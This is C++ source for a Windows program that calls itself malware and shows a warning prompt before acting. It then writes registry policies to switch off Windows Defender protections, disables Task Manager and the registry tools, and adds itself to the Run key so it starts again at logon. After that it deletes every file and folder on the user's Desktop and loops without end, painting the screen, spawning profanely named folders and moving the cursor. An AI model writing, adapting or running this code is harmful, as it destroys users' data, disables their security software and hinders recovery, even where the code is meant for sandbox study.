#include <filesystem>
#include <iostream>
#include <Lmcons.h>
#include <thread>
#include <vector>
#include <Windows.h>
#include <string>


int SCREEN_WIDTH = 1920; //default
int SCREEN_HEIGHT = 1080; //default
const int NUM_THREADS = 6;

void WritePixels(HDC hdc, COLORREF color, int startX, int endX);
LPCWSTR GenerateRandomAppName();
void CreateFolders(unsigned int pathEnum);
void DeleteFolder(std::string path, bool isDir);

int main() {
    HDC hdc = GetDC(NULL);
    RECT desktop;
    HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    SCREEN_WIDTH = desktop.right;
    SCREEN_HEIGHT = desktop.bottom;

    int result = MessageBoxA(NULL, "THIS PROGRAM IS A MALWARE. It can cause serious harms to this computer. Make sure to run this on a virtual environment.", "ATTENTION", MB_ICONWARNING | MB_OKCANCEL);
    if (result != IDOK) {
        exit(0);
    }

    HKEY hKey5;
    DWORD disable = 1;
    LONG dfRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &hKey5);
    if (dfRes == ERROR_SUCCESS) {
        RegSetValueEx(hKey5, L"DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        HKEY hKey4;
        RegCreateKeyEx(hKey5, L"Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hKey4, 0);
        RegSetValueEx(hKey4, L"DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(hKey4, L"DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(hKey4, L"DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(hKey4, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegCloseKey(hKey5);
        RegCloseKey(hKey4);
    }


    FreeConsole();
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username, &size);
    std::wstring convert1(&username[0]);
    std::string converted(convert1.begin(), convert1.end());
    std::string dPath = "C:\\Users\\" + converted + "\\Desktop";
    int pathEnum = 0;
    SetConsoleTitle(GenerateRandomAppName());


    HKEY hKey;
    DWORD data1 = 1;
    int res = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
    if (res == ERROR_FILE_NOT_FOUND) {
        LONG cRes = RegCreateKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WOW64_32KEY | KEY_WRITE, NULL, &hKey, NULL);
    }
    int res2 = RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&data1, sizeof(DWORD));
    RegCloseKey(hKey);

    HKEY hKey2;
    DWORD data2 = 1;
    int res4 = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey2);
    if (res4 == ERROR_FILE_NOT_FOUND) {
        LONG cRes2 = RegCreateKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WOW64_32KEY | KEY_WRITE, NULL, &hKey2, NULL);
    }

    int res3 = RegSetValueExW(hKey2, L"DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&data2, sizeof(DWORD));
    RegCloseKey(hKey2);

    WCHAR progPath[MAX_PATH];
    GetModuleFileName(NULL, progPath, MAX_PATH);
    HKEY hKey3;
    const WCHAR* startName = L"TestMalware";
    const WCHAR* exePath = progPath;
    LONG lnRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey3);
    if (lnRes == ERROR_SUCCESS) {
        int setRes = RegSetValueExW(hKey3, startName, 0, REG_SZ, (const BYTE*)exePath, (DWORD)(wcslen(exePath) + 1) * sizeof(WCHAR));
    }
    RegCloseKey(hKey3);

    std::vector<std::thread> iterators;
    for (const auto& entry : std::filesystem::directory_iterator(dPath)) {
        iterators.emplace_back(DeleteFolder, entry.path().string(), entry.is_directory());
    }
    for (auto& thread : iterators) {
        thread.join();
    }

    while (true) {
        std::vector<std::thread> threads;
        int sectionWidth = SCREEN_WIDTH / NUM_THREADS;

        for (int i = 0; i < NUM_THREADS; ++i) {
            int startX = i * sectionWidth;
            int endX = (i + 1) * sectionWidth;
            COLORREF color = RGB((rand() % 255), (rand() % 255), (rand() % 255));
            threads.emplace_back(WritePixels, hdc, color, startX, endX);
        }

        for (int i = 0; i < 5; i++) {
            threads.emplace_back(CreateFolders, pathEnum);
        }


        for (auto& thread : threads) {
            thread.join();
        }

        int randomCursorPosX = (rand() % (SCREEN_WIDTH - 1 + 1)) + 1;
        int randomCursorPosY = (rand() % (SCREEN_HEIGHT - 1 + 1)) + 1;
        SetCursorPos(randomCursorPosX, randomCursorPosY);
        if (GetAsyncKeyState(VK_ESCAPE)) {
            return 0;
        }
        pathEnum++;
    }

    ReleaseDC(NULL, hdc);
    return 0;
}

void WritePixels(HDC hdc, COLORREF color, int startX, int endX) {
    for (int x = startX; x < endX; ++x) {
        for (int y = 0; y < SCREEN_HEIGHT; ++y) {
            SetPixel(hdc, x, y, color);
        }
    }
}


LPCWSTR GenerateRandomAppName() {
    srand(static_cast<unsigned int>(time(NULL)));
    const wchar_t lAbc[27] = L"qwertzuiopasdfghjklyxcvbnm";
    const wchar_t uAbc[27] = L"QWERTZUIOPASDFGHJKLYXCVBNM";
    unsigned int length = rand() % (12 - 8) + 12;
    std::wstring result;
    for (unsigned int i = 0; i < length; i++) {
        switch (rand() % 3) {
        case 0:
            result += lAbc[rand() % 26];
            break;
        case 1:
            result += uAbc[rand() % 26];
            break;
        case 2:
            result += static_cast<wchar_t>(rand() % 11);
            break;
        }
    }
    return result.c_str();
}

void CreateFolders(unsigned int pathEnum) {
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username, &size);
    std::wstring convert1(&username[0]);
    std::string converted(convert1.begin(), convert1.end());
    std::string dPath = "C:\\Users\\" + converted + "\\Desktop";
    std::filesystem::current_path(dPath);
    for (int i = 0; i < 3; i++) {
        std::filesystem::create_directory(L"get_fucked" + std::to_wstring(pathEnum));
    }
}

void DeleteFolder(std::string path, bool isDir) {
    if (isDir) {
        std::filesystem::remove_all(path);
    }
    else {
        std::filesystem::remove(path);
    }
}
